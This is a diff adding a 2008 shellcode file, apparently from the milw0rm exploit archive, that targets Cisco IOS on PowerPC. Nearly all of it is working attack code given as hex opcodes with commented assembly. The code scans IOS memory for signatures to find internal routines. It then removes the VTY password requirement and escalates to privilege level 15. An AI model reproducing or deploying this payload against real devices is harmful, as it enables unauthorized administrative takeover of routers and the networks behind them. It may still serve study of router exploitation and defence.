@@ -1,0 +1,83 @@
+# Version-independent IOS shellcode, Andy Davis 2008
+#
+# No hard-coded IOS addresses required
+#
+# The technique uses 4-byte signatures near references to the
+# required addresses within the IOS "text" memory region.
+# The addresses are then recovered from memory and used within the
+# shellcode.
+#
+# This is beta 1 - this code can be highly optimised I'm sure,
+# for example, the search routine could be reused and the number
+# of registers cleared could be reduced - but it works  :-) 
+#
+# As this is the first iteration of this shellcode, I'm not making any
+# claims as to exactly how portable it is - it has been tested on a
+# number of IOS images and therefore, the concept has been demonstrated.
+#
+# Various simple techniques have been used to ensure that there are
+# no nulls in the shellcode
+
+
+.equ    sig_vty, 0x7F60B910     # signature for vty_info
+.equ    sig_kill, 0x639C8889    # signature for terminate()
+.equ    start, 0x80018001       # start of the search
+
+
+3c 80 80 02     lis     r4,-32766
+38 84 80 01     addi    r4,r4,-32767	# the start address for the search
+3c a0 63 9d     lis     r5,25501
+38 a5 88 89     addi    r5,r5,-30583	# the "sig_kill" search signature
+38 e7 01 94     addi    r7,r7,404	# add 4 without introducing nulls
+(technique used throughout the shellcode)
+38 e7 fe 70     addi    r7,r7,-400
+7c c4 38 6e l1: lwzux   r6,r4,r7
+7c 06 28 40     cmplw   r6,r5		# is address contents equal to signature
+40 82 ff f8     bne     18 <l1>		# no, keep searching
+7c a5 2a 78     xor     r5,r5,r5	# yes, found "sig_kill"
+38 84 01 e8     addi    r4,r4,488	
+38 84 fe 70     addi    r4,r4,-400
+7c c4 28 2e     lwzx    r6,r4,r5
+38 a5 01 98     addi    r5,r5,408	
+38 a5 fe 70     addi    r5,r5,-400
+7c c6 28 30     slw     r6,r6,r5
+7c c6 2c 30     srw     r6,r6,r5
+38 c6 ff ff     addi    r6,r6,-1	# r6 now contains the offset of
+terminate() from here
+7c 84 32 14     add     r4,r4,r6	# add offset to current address
+7c 8a 23 78     mr      r10,r4		# address of terminate() saved into r10
+7c e7 3a 78     xor     r7,r7,r7
+3c a0 7f 61     lis     r5,32609
+38 a5 b9 10     addi    r5,r5,-18160	# the "sig_vty" search signature
+38 e7 01 94     addi    r7,r7,404
+38 e7 fe 70     addi    r7,r7,-400
+7c c4 38 6e l2: lwzux   r6,r4,r7
+7c 06 28 40     cmplw   r6,r5		# is address contents equal to signature
+40 82 ff f8     bne     64 <l2>		# no, keep searching
+38 84 01 a8     addi    r4,r4,424	# yes, found "sig_vty"
+38 84 fe 70     addi    r4,r4,-400
+7c e7 3a 78     xor     r7,r7,r7
+7c a4 38 2e     lwzx    r5,r4,r7	# get two MSBs
+38 a5 ff ff     addi    r5,r5,-1
+7d 08 42 78     xor     r8,r8,r8
+39 08 01 a0     addi    r8,r8,416
+39 08 fe 70     addi    r8,r8,-400
+7c a5 40 30     slw     r5,r5,r8	# shift MSBs into the right place (XXXX0000)
+38 84 01 94     addi    r4,r4,404
+38 84 fe 70     addi    r4,r4,-400
+7c c4 38 2e     lwzx    r6,r4,r7	# get two LSBs
+7c c6 40 30     slw     r6,r6,r8	
+7c c6 44 30     srw     r6,r6,r8	# shift LSBs to clear the MSBs (0000YYYY)
+7c a5 32 14     add     r5,r5,r6	# add the two together (XXXXYYYY)
+38 a5 01 08     addi    r5,r5,264	# move to the 66th element of the
+array (VTY 0 - see IOS "systat" command)
+7d 05 38 2e     lwzx    r8,r5,r7	# r8 = vty_info
+90 e8 01 74     stw     r7,372(r8)	# Remove the requirement to enter a password
+38 e7 ff ff     addi    r7,r7,-1
+39 08 09 1a     addi    r8,r8,2330
+90 e8 04 ca     stw     r7,1226(r8)	# privilege escalate to level 15
+7c e3 3b 78     mr      r3,r7
+7d 49 03 a6     mtctr   r10
+4e 80 04 20     bctr			# terminate "this process"
+
+# milw0rm.com [2008-08-21]
